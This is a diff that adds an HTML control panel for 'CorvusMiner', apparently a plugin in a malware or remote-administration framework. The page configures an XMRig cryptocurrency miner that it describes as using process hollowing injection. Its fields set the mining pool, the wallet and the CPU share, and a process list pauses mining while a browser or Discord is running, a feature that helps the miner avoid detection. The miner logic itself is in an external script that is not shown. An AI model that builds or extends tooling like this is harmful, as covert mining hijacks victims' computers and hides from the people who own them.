@@ -1,0 +1,57 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>CorvusMiner</title>
+    <link rel="stylesheet" href="/plugins/corvusminer/assets/corvusminer.css" />
+  </head>
+  <body>
+    <main class="container">
+      <header class="header">
+        <h1>CorvusMiner</h1>
+        <p class="sub">XMRig miner &mdash; process hollowing injection</p>
+      </header>
+
+      <section class="card">
+        <h2>XMRig Mining Config</h2>
+        <div class="row">
+          <label class="label">Pool URL</label>
+          <input id="pool" class="input" placeholder="stratum+tcp://pool.example.com:3333" />
+        </div>
+
+        <div class="row">
+          <label class="label">Username (Wallet)</label>
+          <input id="username" class="input" placeholder="your_wallet_address.worker" />
+        </div>
+
+        <div class="row">
+          <label class="label">Password</label>
+          <input id="password" class="input" placeholder="password" value="x" />
+        </div>
+
+        <div class="row">
+          <label class="label">CPU Max Threads Hint (% of max)</label>
+          <input id="threads-hint" class="input" type="number" placeholder="100" value="100" />
+        </div>
+
+        <div class="row">
+          <label class="label">Block Mining if Running (comma-separated)</label>
+          <input id="kill-processes" class="input" placeholder="e.g. chrome.exe,firefox.exe,discord.exe" />
+        </div>
+
+        <div class="actions">
+          <button id="start-mining-btn" class="btn">Start Mining</button>
+          <button id="stop-mining-btn" class="btn">Stop Mining</button>
+        </div>
+      </section>
+
+      <section class="card">
+        <h2>Log</h2>
+        <pre id="log" class="log"></pre>
+      </section>
+    </main>
+
+    <script src="/plugins/corvusminer/assets/corvusminer.js"></script>
+  </body>
+</html>
